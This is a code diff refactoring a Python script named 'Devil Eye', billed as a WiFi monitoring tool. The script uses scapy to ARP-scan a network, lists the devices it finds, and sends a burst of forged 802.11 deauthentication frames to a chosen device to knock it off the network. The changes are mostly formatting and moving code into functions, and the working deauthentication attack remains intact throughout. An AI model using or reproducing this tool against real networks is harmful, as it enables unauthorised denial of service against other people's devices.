@@ -6,19 +6,22 @@ from scapy.all import ARP, Dot11, Dot11Deauth, Ether, RadioTap, sendp, srp
 
 logging.basicConfig(filename='devileye.log', level=logging.INFO)
 
+
 def clear():
     os.system('cls' if os.name == 'nt' else 'clear')
+
 
 def display_intro():
     print("Welcome to Devil Eye - your WiFi monitoring tool!")
     print("=============================================================")
+
 
 def scan_network(target_ip):
     clear()
     display_intro()
     arp = ARP(pdst=target_ip)
     ether = Ether(dst="ff:ff:ff:ff:ff:ff")
-    packet = ether/arp
+    packet = ether / arp
     result = srp(packet, timeout=3, verbose=0)[0]
     devices = []
     id_num = 0
@@ -26,10 +29,11 @@ def scan_network(target_ip):
         id_num += 1
         devices.append({'id': id_num, 'ip': received.psrc, 'mac': received.hwsrc})
     print("Current Devices on the Network:")
-    print("ID  " + "IP" + " "*15 + "MAC")
+    print("ID  " + "IP" + " " * 15 + "MAC")
     for device in devices:
         print("{:3} {:16} {}".format(device['id'], device['ip'], device['mac']))
     return devices
+
 
 def get_user_input(devices):
     device_id = input("\nEnter the ID number of the device you want to kick (or 'q' to quit): ")
@@ -45,13 +49,16 @@ def get_user_input(devices):
         return get_user_input(devices)
     return device_id
 
+
 def kick_device(target_device, iface):
     target_mac = target_device['mac']
     logging.info('Kicking device {}: IP={}, MAC={}'.format(target_device['id'], target_device['ip'], target_mac))
     print("\nKicking device {}...".format(target_device['id']))
-    pkt = RadioTap()/Dot11(addr1=target_mac, addr2='ff:ff:ff:ff:ff:ff', addr3='ff:ff:ff:ff:ff:ff')/Dot11Deauth()
+    pkt = RadioTap() / Dot11(addr1=target_mac, addr2='ff:ff:ff:ff:ff:ff', addr3='ff:ff:ff:ff:ff:ff') / Dot11Deauth()
     sendp(pkt, inter=0.1, count=100, iface=iface)
     print("Device {} has been kicked!".format(target_device['id']))
+
+
 def main():
     parser = argparse.ArgumentParser(description='Devil Eye - your WiFi monitoring tool')
     parser.add_argument('iface', metavar='iface', type=str, help='the name of the interface to use for packet injection')
@@ -59,57 +66,25 @@ def main():
     args = parser.parse_args()
 
     # Clear the terminal
-    os.system('cls' if os.name == 'nt' else 'clear')
+    clear()
 
     # Display intro screen
-    print("Welcome to Devil Eye - your WiFi monitoring tool!") 
-    print("=============================================================")
+    display_intro()
 
     # Define the network to scan
     target_ip = args.ip
 
-    # Create ARP packet and broadcast it to get all the devices' MAC and IP addresses on the network
-    arp = ARP(pdst=target_ip)
-    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
-    packet = ether/arp
-    result = srp(packet, timeout=3, verbose=0, iface=args.iface)[0]
-
-    # Create a list of devices found on the network
-    devices = []
-    id_num = 0
-    for sent, received in result:
-        id_num += 1
-        devices.append({'id': id_num, 'ip': received.psrc, 'mac': received.hwsrc})
-
-    # Print the list of devices found on the network
-    print("Current Devices on the Network:")
-    print("ID  " + "IP" + " "*15 + "MAC")
-    for device in devices:
-        print("{:3} {:16} {}".format(device['id'], device['ip'], device['mac']))
+    # Scan the network and get a list of devices
+    devices = scan_network(target_ip)
 
     # Prompt the user to enter the ID number of the device they want to kick
-    device_id = input("\nEnter the ID number of the device you want to kick (or 'q' to quit): ")
+    device_id = get_user_input(devices)
 
-    # Find the device in the list of devices based on its ID number
-    target_device = None
-    for device in devices:
-        if device['id'] == int(device_id):
-            target_device = device
-            break
-
-    # If the target device is found, create a deauthentication packet and send it to the target device's MAC address
-    if target_device:
-        target_mac = target_device['mac']
-        print("\nKicking device {}...".format(device_id))
-        pkt = RadioTap()/Dot11(addr1=target_mac, addr2='ff:ff:ff:ff:ff:ff', addr3='ff:ff:ff:ff:ff:ff')/Dot11Deauth()
-        sendp(pkt, inter=0.1, count=100, iface=args.iface)
-        print("Device {} has been kicked!".format(device_id))
+    # If the user didn't choose to quit and a device was selected, kick the device
+    if device_id is not None:
+        target_device = [device for device in devices if device['id'] == device_id][0]
+        kick_device(target_device, args.iface)
     else:
-        if device_id == 'q':
-            print("\nGoodbye!")
-        else:
-            print("\nDevice {} not found. Please try again.".format(device_id))
-
-    # Add a cool animation
-    time.sleep(1)
-    print("\n" + "-"*40)
+        print("\nGoodbye!")
+if __name__ == '__main__':
+    main()
